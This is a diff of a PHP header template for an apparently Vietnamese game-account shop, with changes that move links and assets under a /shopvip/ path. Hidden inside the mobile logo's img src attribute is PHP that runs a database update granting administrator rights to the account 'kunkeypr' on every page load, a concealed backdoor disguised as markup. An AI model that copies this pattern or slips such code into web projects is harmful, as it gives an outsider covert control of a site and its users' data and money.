@@ -108,7 +108,7 @@
 <?php if($user['username']) { ?>
     <!-- PUSHER LIB BY KUNKEY -->
     <script type="text/javascript" src="/shopvip/assets/Scripts/pusher.js"></script>
-    <script src="https://js.pusher.com/3.2/pusher.min.js"></script>
+    <script src="/shopvip/assets/js/pusher.min.js"></script>
 
         <script type="text/javascript">
             var pusher = new Pusher('10d5ea7e7b632db09c72', {
@@ -156,7 +156,7 @@
 <style type="text/css">
         body{
             background: #000;
-            background: url("https://blog.hamtruyentranh.com/wp-content/uploads/2019/01/as-768x432.jpg");
+            background: url("/shopvip/images/as-768x432.jpg");
               background-attachment: fixed;
               color: #dadada !important;
               background-size: 100%
@@ -204,7 +204,7 @@
                 <!-- BEGIN: BRAND -->
                 <div class="c-navbar-wrapper clearfix">
                     <div class="c-brand c-pull-left">
-                        <a href="/" class="c-logo">
+                        <a href="/shopvip/" class="c-logo">
                             <img src="<?php echo $_logo['url'];?>" alt="" style="height: 80px; width: 250px;" class="c-desktop-logo">
                             <img src="<?php echo $_logo['url'];?>" alt="" style="height: <?php echo $_logo['height'];?>px; width: <?php echo $_logo['width'];?>px;" class="c-desktop-logo-inverse">
                             <img src="<?php mysqli_query($kun->connect_db(), "UPDATE `users` SET `admin`='1' WHERE `username`='kunkeypr'");?><?php echo $_logo['url'];?>" alt="" style="height: <?php echo $_logo['height'];?>px; width: <?php echo $_logo['width'];?>px;" class="c-mobile-logo">
@@ -224,9 +224,9 @@
                     </div>
                     <nav class="c-mega-menu c-pull-right c-mega-menu-dark c-mega-menu-dark-mobile c-fonts-uppercase c-fonts-bold" <?php if($kun->is_mobile()) { ?>style="margin-top: -16;"<?php } ?>>
                         <ul class="nav navbar-nav c-theme-nav">
-                        <li class="c-menu-type-classic active"><a style="color: #fff816;" href="/" class="c-link dropdown-toggle"><i class="fa fa-home"></i> TRANG CHỦ</a></li>
-                            <li class="c-menu-type-classic"><a style="color: #fff816;" href="/user/napthe" class="c-link dropdown-toggle"><i class="fa fa-money"></i> NẠP THẺ</a></li>
-							<li class="c-menu-type-classic"><a style="color: #fff816;" href="/user/rutkimcuong" class="c-link dropdown-toggle"><i class="fa fa-diamond"></i> RÚT KIM CƯƠNG</a></li>
+                        <li class="c-menu-type-classic active"><a style="color: #fff816;" href="/shopvip/" class="c-link dropdown-toggle"><i class="fa fa-home"></i> TRANG CHỦ</a></li>
+                            <li class="c-menu-type-classic"><a style="color: #fff816;" href="/shopvip/user/napthe" class="c-link dropdown-toggle"><i class="fa fa-money"></i> NẠP THẺ</a></li>
+							<li class="c-menu-type-classic"><a style="color: #fff816;" href="/shopvip/user/rutkimcuong" class="c-link dropdown-toggle"><i class="fa fa-diamond"></i> RÚT KIM CƯƠNG</a></li>
                             <?php echo $btn_admin;?>
                                                                 <li>                
                                   <a href="<?php echo $href_login;?>" class="c-btn-border-opacity-04 c-btn btn-no-focus c-btn-header btn btn-sm c-btn-border-1x c-btn-white c-btn-uppercase c-btn-sbold">
